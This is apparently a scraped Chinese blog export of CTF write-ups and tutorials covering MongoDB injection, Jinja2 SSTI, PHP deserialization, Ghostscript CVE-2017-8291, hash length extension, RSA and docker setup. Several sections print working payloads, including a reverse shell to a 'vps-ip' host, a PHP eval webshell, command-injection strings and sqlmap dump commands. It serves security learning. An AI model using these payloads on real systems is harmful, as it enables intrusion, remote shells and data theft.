$where注入MongoDB里面的$where跟sql的where很相似，都是加入限制条件进行查询。但是MongoDB里面的$where操作符常常会引入一个js函数作为 限制条件来造成注入后台代码1234567891011121314&lt;?php$mongo = new mongoclient();$db = $mongo-&gt;myinfo; //选择数据库$coll = $db-&gt;news; //选择集合$news = $_GET['news'];$function = \"function() &#123;if(this.news == '$news') return true&#125;\";echo $function;$result = $coll-&gt;find(array('$where'=&gt;$function));if ($result-&gt;count()&gt;0) &#123; echo '该新闻存在';&#125;else&#123; echo '该新闻不存在';&#125;?&gt; 上面这个代码如果我们输入news=test&#39;%26%26&#39;1&#39;=&#39;1会返回正常页面，然后输入news=test&#39;%26%26&#39;1&#39;=&#39;2会返回异常页面，那么我们就可以尝试一下进行注入了爆数据表名1news=test'%26%26db.getCollectionNames()[0][0]=='m'%26%26'1'=='1","comments":true,"permalink":"https://xi4or0uji.github.io/2019/02/27/MongoDB注入/","categories":[{"name":"WEB","slug":"WEB","permalink":"https://xi4or0uji.github.io/categories/WEB/"}],"tags":[{"name":"MongoDB","slug":"MongoDB","permalink":"https://xi4or0uji.github.io/tags/MongoDB/"}]},{"title":"2018 Tokyo Westerns CTF","date":"2019-02-25T16:00:00.000Z","path":"2019/02/26/2018-Tokyo-Westerns-CTF/","text":"WEBSimple Auth首先可以拿到源码1234567891011121314151617181920212223242526272829303132 &lt;?phprequire_once 'flag.php';if (!empty($_SERVER['QUERY_STRING'])) &#123; $query = $_SERVER['QUERY_STRING']; $res = parse_str($query); if (!empty($res['action']))&#123; $action = $res['action']; &#125;&#125;if ($action === 'auth') &#123; if (!empty($res['user'])) &#123; $user = $res['user']; &#125; if (!empty($res['pass'])) &#123; $pass = $res['pass']; &#125; if (!empty($user) &amp;&amp; !empty($pass)) &#123; $hashed_password = hash('md5', $user.$pass); &#125; if (!empty($hashed_password) &amp;&amp; $hashed_password === 'c019f6e5cd8aa0bbbcc6e994a54c757e') &#123; echo $flag; &#125; else &#123; echo 'fail :('; &#125;&#125;else &#123; highlight_file(__FILE__);&#125; 它需要传过去的action等于auth，记录下user和pass，如果md5(user.pass)===’c019f6e5cd8aa0bbbcc6e994a54c757e’，那就有flag很明显直接md5进行解密是不行的，但是我们看到有个parse_str函数，而且还没有第二个参数，因此可以进行变量覆盖的漏洞利用，payload：1?action=auth&amp;hashed_password=c019f6e5cd8aa0bbbcc6e994a54c757e 然后就能拿到flag1TWCTF&#123;d0_n0t_use_parse_str_without_result_param&#125; Shrine这题进去就给了源码1234567891011121314151617181920import flaskimport osapp = flask.Flask(__name__)app.config['FLAG'] = os.environ.pop('FLAG')@app.route('/')def index(): return open(__file__).read()@app.route('/shrine/&lt;path:shrine&gt;')def shrine(shrine): def safe_jinja(s): s = s.replace('(', '').replace(')', '') blacklist = ['config', 'self'] return ''.join(['&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'.format(c) for c in blacklist])+s return flask.render_template_string(safe_jinja(shrine))if __name__ == '__main__': app.run(debug=True) 可以看到用了jinja和有一堆黑名单，猜测是jinja2的ssti注入 信息收集1、/shrine/&lt;path: shrine&gt;是注入点2、过滤了括号和config以及self3、漏洞是jinja2的ssti漏洞 简单尝试试下能不能执行12http://shrine.chal.ctf.westerns.tokyo/shrine/&#123;&#123;3*3&#125;&#125;&gt;&gt;&gt;&gt;9 确实可以进行ssti，但是我们要想办法绕开waf如果完全没有waf，我们可以1234567# confighttp://shrine.chal.ctf.westerns.tokyo/shrine/&#123;&#123;config&#125;&#125;# self# &#123;&#123;self&#125;&#125; =&gt; &lt;TemplateReference None&gt;http://shrine.chal.ctf.westerns.tokyo/shrine/&#123;&#123;self.__dict__&#125;&#125;# ()http://shrine.chal.ctf.westerns.tokyo/shrine/&#123;&#123;[].__class__.__base__.__subclasses__()[68].__init__.__globals__['os'].__dict__.environ['FLAG']&#125;&#125; 但是现在有waf，所以我们不能直接利用，这里大佬给了两个利用点url_for在url_for里面，我们可以找到current_app12&#123;&#123;url_for.__globals__&#125;&#125;http://shrine.chal.ctf.westerns.tokyo/shrine/&#123;&#123;url_for.__globals__['current_app'].config['FLAG']&#125;&#125; get_flashed_messages这个里面也能找到current_app12&#123;&#123;get_flashed_messages.__globals__&#125;&#125;http://shrine.chal.ctf.westerns.tokyo/shrine/&#123;&#123;get_flashed_messages.__globals__['current_app'].config['FLAG']&#125;&#125; 这样就能拿到flag了TWCTF{pray_f0r_sacred_jinja2} slack emoji converter依旧是能拿到源码1234567891011121314151617181920212223242526272829303132333435363738394041424344from flask import ( Flask, render_template, request, redirect, url_for, make_response,)from PIL import Imageimport tempfileimport osapp = Flask(__name__)@app.route('/')def index(): return render_template('index.html')@app.route('/source')def source(): return open(__file__).read()@app.route('/conv', methods=['POST'])def conv(): f = request.files.get('image', None) if not f: return redirect(url_for('index')) ext = f.filename.split('.')[-1] fname = tempfile.mktemp(\"emoji\") fname = \"&#123;&#125;.&#123;&#125;\".format(fname, ext) f.save(fname) img = Image.open(fname) w, h = img.size r = 128/max(w, h) newimg = img.resize((int(w*r), int(h*r))) newimg.save(fname) response = make_response() response.data = open(fname, \"rb\").read() response.headers['Content-Disposition'] = 'attachment; filename=emoji_&#123;&#125;'.format(f.filename) os.unlink(fname) return responseif __name__ == '__main__': app.run(host=\"0.0.0.0\", port=8080, debug=True) 这题考了GhostButt任意命令执行（cve-2017-8291），通过bypass dSAFER参数达到目的，exp如下12345678910!PS-Adobe-3.0 EPSF-3.0%%BoundingBox: 0 0 30 30userdict /setpagedevice undefsavelegal&#123; null restore &#125; stopped &#123; pop &#125; if&#123; legal &#125; stopped &#123; pop &#125; ifrestoremark /OutputFile (%pipe%python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"vps-ip\",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);') currentdevice putdeviceprops 然后就能getshell了具体分析请参考： https://paper.seebug.org/310/https://github.com/vulhub/vulhub/tree/master/python/PIL-CVE-2017-8291","comments":true,"permalink":"https://xi4or0uji.github.io/2019/02/26/2018-Tokyo-Westerns-CTF/","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"2019tamuctf","date":"2019-02-23T16:00:00.000Z","path":"2019/02/24/2019tamuctf/","text":"WEBNot Another SQLi Challenge最简单的sql注入题，万能密码就能拿到flag了12admin' or 1=1#flag: gigem&#123;f4rm3r5_f4rm3r5_w3'r3_4ll_r16h7&#125; Robots Rule他要求是谷歌的robot访问，抓包改一下 Many Gig’ems to you!这道题很脑洞，index.html、cookies.html和cook.js里面藏有flag所以flag就是gigem{flag_in_source_and_cookies} Science!这道题提示了是用Flask写的，所以尝试一下flask模板注入49确实是能回显49的，接下来就是看有什么可以用了看到有个os类然后就是看有什么文件 1&#123;&#123;url_for.__globals__.os.popen('ls ').read()&#125;&#125; 最后读flag1&#123;&#123;url_for.__globals__.os.popen('cat flag.txt').read()&#125;&#125; 这里有个坑就是这道题用火狐打开浏览器居然崩溃，摇头.gif Buckets这道题对于国内且英文不好的选手有点不友好，毕竟不知道s3 bucket是什么，谷歌一波发现是一个云存储的东西吧，知道一个站点的名字就可以看见存储的东西然后访问一下http://tamuctf.s3.amazonaws.com/看见访问一下就能看到flag了 login app这道题源码可以看到这一段然后可以知道是mongodb注入最后getflaggigem{n0_sql?_n0_pr0bl3m_8a8651c31f16f5dea} Bird Box Challenge很简单的sql注入，一开始我还以为是ssrf搞了半天………. 1337 Secur1ty查看cookie可以看见有个secret，猜测secret是一个表明身份的序号，接下来就是想办法拿到admin的secret值message页面有个id值，直接修改会显示不同的信件，尝试一下sql注入1sqlmap -u http://web6.tamuctf.com/message?id=2 -dbs 1sqlmap -u http://web6.tamuctf.com/message?id=2 -D 1337_Secur1ty --tables 1sqlmap -u http://web6.tamuctf.com/message?id=2 -D 1337_Secur1ty -T Users --columns 1sqlmap -u http://web6.tamuctf.com/message?id=2 -D 1337_Secur1ty -T Users -C UserID,FirstName,LastName,Secret --dump 截止就是伪造身份登录了最后getflaggigem{th3_T0tp_1s_we4k_w1tH_yoU} cryptoRSAaaay题目1234Hey, you're a hacker, right? I think I am too, look at what I made!(2531257, 43)My super secret message: 906851 991083 1780304 2380434 438490 356019 921472 822283 817856 556932 2102538 2501908 2211404 991083 1562919 38268Problem is, I don't remember how to decrypt it... could you help me out? 分解下n然后脚本一把梭123456789101112131415161718import libnumfrom Crypto.Util.number import long_to_bytesp = 509q = 4973n = 2531257e = 43c = [906851,991083,1780304,2380434,438490,356019,921472,822283,817856,556932,2102538,2501908,2211404,991083,1562919,38268]d = libnum.invmod(e,(p-1)*(q-1))for i in c: m = pow(i,d,n) print m#这是上面出来的明文，猜测是ascii码m = [103,105,103,101,109,123,83,97,118,97,103,101,95,83,105,120,95,70,108,121,105,110,103,95,84,105,103,101,114,115,125]str = \"\"for i in m: str += chr(i)print str","comments":true,"permalink":"https://xi4or0uji.github.io/2019/02/24/2019tamuctf/","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"2018百越杯wp","date":"2019-02-23T16:00:00.000Z","path":"2019/02/24/2018百越杯wp/","text":"WEBwarmup源码1234567891011121314151617 &lt;?php require_once('flag.php'); error_reporting(0); if(!isset($_GET['u']))&#123; highlight_file(__FILE__); die(); &#125;else&#123; $i=$_GET['i']; $u=$_GET['u']; if($_GET['u']!=\"Hello World\")&#123; die('die...'); &#125; assert(\"$i == $u\"); // TODO // echo $flag; &#125; 有个assert函数，利用注释符将后面的东西注释掉，然后进行命令执行，payload12?u=Hello World&amp;i=system('cat flag.php');//?u=Hello World&amp;i=system('sort flag.php');%23 simple ser源码12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpclass cls1&#123; var $cls; var $arr; function show()&#123; show_source(__FILE__); &#125; function __wakeup()&#123; foreach($this-&gt;arr as $k =&gt; $v) echo $this-&gt;cls-&gt;$v; &#125;&#125;class cls2&#123; var $filename = 'hello.php'; var $txt = ''; function __get($key)&#123; var_dump($key); if($key == 'fileput') return $this-&gt;fileput(); else return '&lt;p&gt;'.htmlspecialchars($key).'&lt;/p&gt;'; &#125; function fileput()&#123; if(strpos($this-&gt;filename,'../') !== false || strpos($this-&gt;filename,'\\\\') !== false) die(); $content = '&lt;?php die(\\'stupid\\'); ?&gt;'; $content .= $this-&gt;txt; file_put_contents($this-&gt;filename, $content); return htmlspecialchars($content); &#125;&#125;if(!empty($_GET))&#123; $cls = base64_decode($_GET['ser']); $instance = unserialize($cls);&#125;else&#123; $a = new cls1(); $a-&gt;show();&#125; 一道很经典的反序列化题，pop链如下：通过cls1的_wakeup方法调用cls2的_get方法，然后调用fileput方法，绕过里面的退出，写个小马，然后任意命令执行exp如下1234567$c1 = new cls1();$c2 = new cls2();$c1-&gt;cls = $c2;$c1-&gt;arr = ['a'=&gt;'fileput'];$c2-&gt;filename = 'php://filter/write=convert.base64-decode/resource=hello.php';$c2-&gt;txt = 'PD9waHAgZXZhbChAJF9QT1NUWydjbWQnXSk7Pz4=';echo base64_encode(serialize($c1)); 然后直接ser发送过去就会生成hello.php小马，接着菜刀就行 Download it这题考的是php随机函数的安全性漏洞，在SWPU也考过，首先可以看到三张源码图通过源码我们可以确定，考察的就是随机数的安全问题，所以先找种子在index.php里面有个随机数IJiJXvRf，先拿去爆破1234567$str = \"IJiJXvRf\";$rand = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\";for ($i=0; $i&lt;strlen($str); $i++)&#123; $pos = strpos($rand,$str[$i]); echo $pos.\" \".$pos.\" \".\"0 \".(strlen($rand)-1).\" \";&#125; 然后生成32位的随机码123456789101112131415function gen_rand($length)&#123; $chars = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\"; $randstr = ''; for ( $i = 0; $i &lt; $length; $i++ ) &#123; $randstr .= $chars[ mt_rand(0, strlen($chars) - 1) ]; &#125; return $randstr;&#125;echo \"&lt;br&gt;\";//IJiJXvRfmt_srand(810504305);echo gen_rand(8);echo \"&lt;br&gt;\";echo gen_rand(32);echo \"&lt;br&gt;\"; 然后读flag1echo authcode(\"filename=flag\",\"ENCODE\",\"OaxSTnku5XqaQ9ly6D14roxGFTF5KbQj\"); 然后将得到的进行url编码接着访问download.php?download=就行了 easy flask这题先去注册登录，然后可以看到有个session解密一下出来是一个id值登录页面发现有id这个参数，遍历一下可以看到id是5时，用户是admin扫下泄露出来一个www.zip ，可以看到，想要拿到flag，必须是管理员12345678@bp_auth.route('/flag')@login_checkdef get_flag(): if(g.user.username==\"admin\"): with open(os.path.dirname(__file__)+'/flag','rb') as f: flag = f.read() return flag return \"Not admin!!\" 继续看下secret.py有个views_info函数123456789101112131415161718192021222324@bp_secert.route('/views',methods = ['GET','POST'])@login_checkdef views_info(): view_id = request.args.get('id') if not view_id: view_id = session.get('user_id') user_m = user.query.filter_by(id=view_id).first() if user_m is None: flash(u\"该用户未注册\") return render_template('secert/views.html') if str(session.get('user_id'))==str(view_id): secert_m = secert.query.filter_by(id=view_id).first() secert_t = u\"&lt;p&gt;&#123;secert.secert&#125;&lt;p&gt;\".format(secert = secert_m) else: secert_t = u\"&lt;p&gt;***************************************&lt;p&gt;\" name = u\"&lt;h1&gt;name:&#123;user_m.username&#125;&lt;h1&gt;\" email = u\"&lt;h2&gt;email:&#123;user_m.email&#125;&lt;h2&gt;\" info = (name+email+secert_t).format(user_m=user_m) return render_template('secert/views.html',info = info) 可以看到，这里有个format函数，里面有name、email和secret_t，继续往上看，还有一个format函数，解析secret_m，secret_m就是页面edit_secret的那个参数，至此，我们就可以利用format格式化字符串漏洞获得secret-key然后session伪造登录payload如下1&#123;user_m.__class__.__mro__[1].__class__.__mro__[0].__init__.__globals__[SQLAlchemy].__init__.__globals__[current_app].config&#125; 最后得到secret_key为ichunqiuQAQ013，接下来就是session的伪造123456789101112from flask import Flask,sessionapp = Flask(__name__)app.config['SECRET_KEY'] = 'ichunqiuQAQ013'def set_id(): session['id'] = 5 return \"ok\"if __name__ == '__main__': app.debug = True app.run() 然后修改session登录访问/flag就有flag misc签到一张数独的图，拿去在线解密一下再将所有数字排成一行加密一下就有了加密出来结果是1cee3860fb3f4a52e615fa8aaf3c91f2b 马男波杰克题目只说了要百度，然后图片名字是atool，猜测是atool加密，去在线解密一下http://www.atool.org/steganography.php 血小板天下第一可爱拿到两张图片，一张血小板，一张缺了两个定位点的二维码，补全一下扫出来这个东西1a2V5JTNBJTIwTHNiXzFzX2dyM2F0 base64解密出来是key: Lsb_1s_gr3at，推测是lsb隐写1python lsb.py extract 123.png 123.txt Lsb_1s_gr3at 出来flag是flag{1_l0ve_LSB~} flag_universe拿到一个数据包，然后去追踪ftp流，这里有个坑，有个flag.txt文件，是个flag来的，接着看到有个new_universe.png文件，将它导出来接着去各种操作，最后发现是lsb隐写，一场比赛考两个lsb隐写……. crypto常规rsa这个打开拿到三个文件，一个pubkey.pem，一个flag.enc，还有一个rsa.py，先去提下公钥信息123456789101112Public-Key: (256 bit)Modulus: 00:89:3f:05:5d:0d:c5:fe:76:4d:88:1d:5c:d6:0e: 96:7b:21:2c:e0:49:45:9e:57:d2:e8:41:ed:4a:81: af:77:edExponent: 9850747023606211927 (0x88b4e239fa48e557)Modulus=893F055D0DC5FE764D881D5CD60E967B212CE049459E57D2E841ED4A81AF77EDwriting RSA key-----BEGIN PUBLIC KEY-----MEIwDQYJKoZIhvcNAQEBBQADMQAwLgIhAIk/BV0Nxf52TYgdXNYOlnshLOBJRZ5X0uhB7UqBr3ftAgkAiLTiOfpI5Vc=-----END PUBLIC KEY----- 看到n比较小，直接去网站分解下n12q = 184333227921154992916659782580114145999p = 336771668019607304680919844592337860739 同时看encrypt函数，可以看见有个try … except ，而且flag.enc 中的数据很大，说明初始的 n 并不是最后加密的 N 值(因为RSA加密需要公钥n的长度至少是大于消息的长度的, 否则加密出来的密文会无法解密. PKCS#1 v1.5的python实现中, 如果公钥n长度小于要加密的消息, 加密会失败)最后exp12345678910111213141516171819202122232425262728293031#!/usr/bin/env python2.7import gmpy2import libnumfrom Crypto.Util.number import getPrimefrom Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_v1_5from base64 import b64decodem = b64decode(open('flag.enc','r').read())n = 62078208638445817213739226854534031566665495569130972218813975279479576033261e = 9850747023606211927q = 184333227921154992916659782580114145999p = 336771668019607304680919844592337860739i=1while 1: print i i+=1 n=q*p if n &gt;= int(m.encode('hex'),16): d = libnum.invmod(e,(p-1)*(q-1)) prikey = RSA.construct((int(n),int(e),int(d))) key = PKCS1_v1_5.new(prikey) m = key.decrypt(m,None) break else: p = gmpy2.next_prime(p**2+q**2) q = gmpy2.next_prime(2*q*p) e = gmpy2.next_prime(e**2)print m 最后的flag1flag&#123;f@cToR__N_bY_!teratlnG!&#125; 买手机题目给了一个商店的源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115#!/usr/bin/env python# encoding: utf-8import randomimport stringimport signalimport sysimport osimport timefrom hashlib import sha256from urlparse import parse_qslos.chdir(os.path.dirname(os.path.abspath(__file__)))signkey = ''.join([random.choice(string.letters+string.digits) for _ in xrange(random.randint(8,32))])items = [ ('iPhone X', 7399), ('iPhone 8', 4599), ('P20 Pro', 5488), ('P20', 3788), ('Honor 10', 2399), ('Mi 8', 2999), ('Find X', 4999), ('Nex', 4498), ('Mate10 Pro', 4899), ('Flag', 99999)]money = random.randint(3000, 30000)def list_items(): for i,item in enumerate(items): print '%2d - %-30s$%d' % (i, item[0], item[1])def order(): n = input_int('Product ID: ') if n &lt; 0 or n &gt;= len(items): print 'Invalid ID!' return payment = 'product=%s&amp;price=%d&amp;timestamp=%d' % (items[n][0], items[n][1], time.time()*1000000) sign = sha256(signkey+payment).hexdigest() payment += '&amp;sign=%s' % sign print 'Your order:\\n%s\\n' % paymentdef pay(): global money print 'Your order:' sys.stdout.flush() payment = raw_input().strip() sp = payment.rfind('&amp;sign=') if sp == -1: print 'Invalid Order!' return sign = payment[sp+6:] try: sign = sign.decode('hex') except TypeError: print 'Invalid Order!' return payment = payment[:sp] signchk = sha256(signkey+payment).digest() if signchk != sign: print 'Invalid Order!' return for k,v in parse_qsl(payment): if k == 'product': product = v elif k == 'price': try: price = int(v) except ValueError: print 'Invalid Order!' return if money &lt; price: print 'Go away you poor bastard!' return money -= price print 'Your current money: $%d' % money print 'You have bought %s' % product if product == 'Flag': print 'Well Done! Here is your flag: %s' % open('flag').read().strip()def input_int(prompt): sys.stdout.write(prompt) sys.stdout.flush() try: n = int(raw_input()) return n except: return 0def menu(): print \"CPU Shop\" while True: print \"Money: $%d\" % money print \"1. List Items\" print \"2. Order\" print \"3. Pay\" print \"4. Exit\" sys.stdout.flush() choice = input_int(\"Command: \") &#123; 1: list_items, 2: order, 3: pay, 4: exit, &#125;.get(choice, lambda *args:1)() sys.stdout.flush()if __name__ == \"__main__\": signal.alarm(60) menu() 可以看到，有四个选项，1是显示商品，2是拿到购买命令，3是购买，4是退出，然后操作要在60秒完成，商品有flag，但是买不起，我们先看order函数123payment = 'product=%s&amp;price=%d&amp;timestamp=%d' % (items[n][0], items[n][1], time.time()*1000000)sign = sha256(signkey+payment).hexdigest()payment += '&amp;sign=%s' % sign 可以看到他会将product，price和一个signkey一起加密，接着看pay函数123456789for k,v in parse_qsl(payment): if k == 'product': product = v elif k == 'price': try: price = int(v) except ValueError: print 'Invalid Order!' return 在pay的时候依旧验证hash值，但是这里还有个问题，他会将里面的product拿出来进行覆盖，因此我们可以选一个够钱买的，然后将product名字替换成Flag，就可以买到flag了至于signkey我们不知道怎么办呢，因为他长度不长，只有8-32位，所以可以利用hashpump进行爆破1234567891011121314151617181920212223242526272829303132#! /usr/bin/env # coding: utf-8from hashpumpy import hashpumpfrom pwn import *context.log_level = 'debug'host = '117.50.13.182'port = 8888r = remote(host, port)r.recvuntil('Command: ')r.sendline(b'2')r.recvuntil('ID: ')r.sendline(b'0')r.recvuntil('Your order:\\n')payment = r.recvline().strip().decode()sp = payment.rfind('&amp;sign=')pay = payment[:sp]hexd = payment[sp+6:]print pay,hexdfor i in range(8,34): print i rec = r.recvuntil('Command: ') print rec if 'flag' in rec: print i,rec break r.sendline('3') hashp = hashpump(hexd, pay, '&amp;product=Flag',i) sendpay = hashp[1] + b'&amp;sign=' + hashp[0].encode() r.sendline(sendpay)","comments":true,"permalink":"https://xi4or0uji.github.io/2019/02/24/2018百越杯wp/","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"python格式化字符串","date":"2019-02-20T16:00:00.000Z","path":"2019/02/21/python格式化字符串/","text":"简介就是使用方法不当导致格式化字符串的时候字符串受我们的控制 python常见格式化字符串的方式百分号形式123name = 'Xi4or0uji'print 'My name is %s' %nameMy name is Xi4or0uji 使用标准库中的模板字符串12345from string import Templatename = 'Xi4or0uji's = Template('My name is $name')print s.substitute(name=name)My name is Xi4or0uji 利用format格式化字符串直接格式化字符串12print 'My name is &#123;&#125;'.format('Xi4or0uji')My name is Xi4or0uji 指定位置1234print 'this is a &#123;0&#125;, that is a &#123;1&#125;'.format('cat','dog')this is a cat, that is a dogprint 'this is a &#123;1&#125;, that is a &#123;0&#125;'.format('cat','dog')this is a dog, that is a cat 设置参数12print 'hello &#123;adj&#125; &#123;name&#125;'.format(adj='little',name='h4ck3r')hello little h4ck3r 百分比格式12print '&#123;:.2%&#125; off'.format(0.20)20.00% off 获得数组的键值12print '&#123;arr[2]&#125;'.format(arr=[0,1,2,3,4,5])2 还有很多，不举例了 一个小栗子123456config = &#123;'SECRET_KEY':'lolololol'&#125;class User(object): def __init__(self,name): self.name = nameuser = User('Xi4or0uji')print 'hello &#123;name&#125;'.format(name=user.__class__.__init__.__globals__) 在这里的format如果可以受我们所控，就可以通过原来的对象获得他的所有的变量，从而将敏感信息打印出来 例题2018百越杯 easy flask这题先去注册登录，然后可以看到有个session解密一下出来是一个id值登录页面发现有id这个参数，遍历一下可以看到id是5时，用户是admin扫下泄露出来一个www.zip ，可以看到，想要拿到flag，必须是管理员12345678@bp_auth.route('/flag')@login_checkdef get_flag(): if(g.user.username==\"admin\"): with open(os.path.dirname(__file__)+'/flag','rb') as f: flag = f.read() return flag return \"Not admin!!\" 继续看下secret.py有个views_info函数123456789101112131415161718192021222324@bp_secert.route('/views',methods = ['GET','POST'])@login_checkdef views_info(): view_id = request.args.get('id') if not view_id: view_id = session.get('user_id') user_m = user.query.filter_by(id=view_id).first() if user_m is None: flash(u\"该用户未注册\") return render_template('secert/views.html') if str(session.get('user_id'))==str(view_id): secert_m = secert.query.filter_by(id=view_id).first() secert_t = u\"&lt;p&gt;&#123;secert.secert&#125;&lt;p&gt;\".format(secert = secert_m) else: secert_t = u\"&lt;p&gt;***************************************&lt;p&gt;\" name = u\"&lt;h1&gt;name:&#123;user_m.username&#125;&lt;h1&gt;\" email = u\"&lt;h2&gt;email:&#123;user_m.email&#125;&lt;h2&gt;\" info = (name+email+secert_t).format(user_m=user_m) return render_template('secert/views.html',info = info) 可以看到，这里有个format函数，里面有name、email和secret_t，继续往上看，还有一个format函数，解析secret_m，secret_m就是页面edit_secret的那个参数，至此，我们就可以利用format格式化字符串漏洞获得secret-key然后session伪造登录payload如下1&#123;user_m.__class__.__mro__[1].__class__.__mro__[0].__init__.__globals__[SQLAlchemy].__init__.__globals__[current_app].config&#125; 最后得到secret_key为ichunqiuQAQ013，接下来就是session的伪造123456789101112from flask import Flask,sessionapp = Flask(__name__)app.config['SECRET_KEY'] = 'ichunqiuQAQ013'def set_id(): session['id'] = 5 return \"ok\"if __name__ == '__main__': app.debug = True app.run() 然后修改session登录访问/flag就有flag","comments":true,"permalink":"https://xi4or0uji.github.io/2019/02/21/python格式化字符串/","categories":[{"name":"WEB","slug":"WEB","permalink":"https://xi4or0uji.github.io/categories/WEB/"}],"tags":[{"name":"python","slug":"python","permalink":"https://xi4or0uji.github.io/tags/python/"}]},{"title":"用docker搭个ctf题目","date":"2019-02-18T16:00:00.000Z","path":"2019/02/19/用docker搭个ctf题目/","text":"最近实验室招新，搭题用到docker，记一下免得以后忘了顺便解释一波，其实docker可以理解成跑在服务器上面的虚拟机，里面有一个个容器，每个容器之间互不干扰，这样子就能很好的让我们部署题目了下面直接上过程找lamp环境1docker search lamp 这里我们用tutum的lamp，然后就拉他的镜像1docker pull tutum/lamp 拉完以后可以检查一下本地的镜像，发现确实有tutum/lamp了1docker images 然后就是建一个docker容器了1docker run -d -p 2333:80 -p 3308:3306 tutum/lamp 这个时候可以看下系统里面的容器1docker ps -a 这个时候可以再去访问一下看下有没有映射成功有了这个页面就行了，剩下的就是部署题目了1docker cp /var/www/html/filename container_id:/var/www/html 这样就能搭好了顺便来一波常用命令123456789101112131415161718#拉镜像docker pull [image]#查看当前镜像docker images#新建容器docker run -d -p [host port]:[docker port] [image]#查看容器docker ps -a#拷贝文件docker cp [outfile] [container id]:[infile]#进去容器docker exec -it [container id] bash#启动容器docker start [container id]#停止容器docker stop [container id]#删除容器(注意要关了容器才能删)docker rm [container id]","comments":true,"permalink":"https://xi4or0uji.github.io/2019/02/19/用docker搭个ctf题目/","categories":[{"name":"docker","slug":"docker","permalink":"https://xi4or0uji.github.io/categories/docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://xi4or0uji.github.io/tags/docker/"}]},{"title":"RSA初探","date":"2019-02-11T16:00:00.000Z","path":"2019/02/12/RSA初探/","text":"最近要给新生们出密码学的题，密码学白痴小肉鸡枯了，只能先学一波 简单概要rsa是非对称加密，具体非对称加密是什么就不解释了，网上也有很多介绍，接下来我们直接进入加解密的过程1、选择两个较大的互不相等的质数p和q，计算 n = p * q2、计算 φ = (p-1) * (q-1)3、选取任意e，使得1 &lt; e &lt; φ，而且 gcd ( e , φ ) = 14、计算e关于φ的模逆元d，即 ( e * d ) % φ = 15、加解密：c = ( m ^ e ) % n，m = ( c ^ d ) % n，c为密文，m为明文，(n,e)为公钥对，(n,d)为私钥对 模逆运算如果( a * b ) % c = 1，那么a和b互为对方模c的模逆元或叫数论倒数，也写成假设a和b两个数互为质数，即gcd ( a , b ) = 1时，有 ax + by = 1，所以 ( a * x ) % b = 1，x就是a对b的模逆元，因此，a对b存在模逆元x的充要条件是 gcd ( a , b ) = 1，对于每一组ab，存在一组满足条件的x，在求逆元的时候取最小正整数解 x mod n简单证明123456789证：给予两个整数a、b，必然存在整数x、y使得ax+by=gcd(a,b)两边除gcd(a,b)，右边成了1，左边a和b除了gcd(a,b)以后，新的a和b就互质即证明ax+by=1 gcd(a,b)=1有整数解想要证明ax+by=1 ab互质有整数解，那就是证明(a%b)*x1+b*y1=1有解又辗转相除法可知，gcd(a,b)=gcd(b,a%b)，即ab互质则b和a%b也会互质让a=b,b=a%b，可得b*x1+(a%b)*y1=1继续a=a%b,b=((a%b)%b)，可得(a%b)*x2+((a%b)%b)*y2=1...最后得到a=1,b=0，即1*xn+0*yn=1，显然成立，证毕 求逆元方法欧几里得算法123456789def egcd(a,b): if b==0: return 1,0,a else: x,y,q = egcd(b,a%b) #gcd(a,b) = gcd(b,a%b) x,y = y,(x-(a//b)*y) return x,y,qdef mod_inv(a,b): return egcd(a,b)[0]%b #求a模b得逆元 gmpy2库12import gmpy2print gmpy2.invert(47,30) 欧几里得算法就是辗转相除法12def gcd(a,b): return a if not b else gcd(b,a%b) 扩展欧几里得算法就是上面求逆元的那个迭代1234567def egcd(a,b): if(b==0): return 1,0,a else: x1,y1,q = egcd(b,a%b) x,y = y1,(x1-(a//b)*y1) return x,y,q 例题概念题jarvisoj veryeasyRSA题目给了pqe三个值，要求算d123p = 3487583947589437589237958723892346254777 q = 8767867843568934765983476584376578389e = 65537 当然可以手工算，也可以直接扔去rsatool去算 jarvisoj Easy RSA这题比起原来的题稍微难一点点，给了n，e和密文，要求算明文12已知一段RSA加密的信息为：0xdc2eeeb2782c且已知加密所用的公钥：(N=322831561921859 e = 23) 先去factordb.com分解一下n，算出p和q算出p=13574881，q=23781539，然后rsatool算d，最后直接大数运算乘出来m = ( c ^ d ) % n最后将它转成字符串就行 模数相关攻击直接分解n攻击条件当n小于512位时，可以直接大数分解得到p和q jarvisoj medium rsa题目给了flag.enc和pubkey.pem文件，先用openssl命令提取信息1openssl rsa -pubin -in pubkey.pem -text -modulus 得到123456789101112Public-Key: (256 bit)Modulus: 00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f: 1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f: be:30:ddExponent: 65537 (0x10001)Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DDwriting RSA key-----BEGIN PUBLIC KEY-----MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDryigb/+l/vjDdAgMBAAE=-----END PUBLIC KEY----- 可以知道n是0xC2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD数字不大，直接放去factordb.com分解一下得到12p=275127860351348928173285174381581152299q=319576316814478949870590164193048041239 